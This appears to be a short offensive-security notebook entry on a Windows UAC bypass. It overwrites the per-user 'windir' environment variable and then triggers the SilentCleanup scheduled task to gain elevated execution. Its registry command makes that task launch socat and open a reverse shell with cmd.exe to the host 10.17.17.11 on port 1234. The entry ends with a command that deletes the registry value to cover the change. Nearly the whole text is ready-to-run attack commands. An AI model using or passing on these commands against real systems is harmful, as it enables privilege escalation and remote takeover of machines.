# Scheduled Tasks
edit environment variables used by programs in scheduled tasks to get a reverse shell(using disk-cleanup)

```text-plain
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.17.17.11:1234 EXEC:cmd.exe,pipes &REM " /f
```

```text-plain
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

```text-plain
reg delete "HKCU\Environment" /v "windir" /f
```

![](Scheduled%20Tasks/24b5ce8c9a6cb1194ed66054bc2ed0.png)